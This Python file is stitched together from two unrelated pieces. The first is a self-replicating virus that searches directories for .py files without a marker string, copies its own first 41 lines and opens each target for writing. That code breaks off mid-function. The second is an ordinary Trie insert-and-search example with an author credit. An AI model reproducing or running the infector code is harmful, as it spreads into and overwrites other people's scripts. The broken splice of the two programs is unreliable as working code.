#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python program for insert and search
# operation in a Trie
  
class TrieNode:
      
    # Trie node class
    def __init__(self):
        self.children = [None]*26
  
        # isEndOfWord is True if node represent the end of the word
        self.isEndOfWord = False
  
class Trie:
      
    # Trie data structure class
    def __init__(self):
        self.root = self.getNode()
  
    def getNode(self):
      
        # Returns new trie node (initialized to NULLs)
        return TrieNode()
  
    def _charToIndex(self,ch):
          
        # private helper function
        # Converts key current character into index
        # use only 'a' through 'z' and lower case
          
        return ord(ch)-ord('a')
  
  
    def insert(self,key):
          
        # If not present, inserts key into trie
        # If the key is prefix of trie node, 
        # just marks leaf node
        pCrawl = self.root
        length = len(key)
        for level in range(length):
            index = self._charToIndex(key[level])
  
            # if current character is not present
            if not pCrawl.children[index]:
                pCrawl.children[index] = self.getNode()
            pCrawl = pCrawl.children[index]
  
        # mark last node as leaf
        pCrawl.isEndOfWord = True
  
    def search(self, key):
          
        # Search key in the trie
        # Returns true if key presents 
        # in trie, else false
        pCrawl = self.root
        length = len(key)
        for level in range(length):
            index = self._charToIndex(key[level])
            if not pCrawl.children[index]:
                return False
            pCrawl = pCrawl.children[index]
  
        return pCrawl.isEndOfWord
  
# driver function
def main():
  
    # Input keys (use only 'a' through 'z' and lower case)
    keys = ["the","a","there","anaswe","any",
            "by","their"]
    output = ["Not present in trie",
              "Present in trie"]
  
    # Trie object
    t = Trie()
  
    # Construct trie
    for key in keys:
        t.insert(key)
  
    # Search for different keys
    print("{} ---- {}".format("the",output[t.search("the")]))
    print("{} ---- {}".format("these",output[t.search("these")]))
    print("{} ---- {}".format("their",output[t.search("their")]))
    print("{} ---- {}".format("thaw",output[t.search("thaw")]))
  
if __name__ == '__main__':
    main()
  
# This code is contributed by Atul Kumar (www.facebook.com/atul.kr.007)
# Time Complexity: O(key_length)
# Soace Compelxity: O(ALPHABET_SIZE * key_length * N)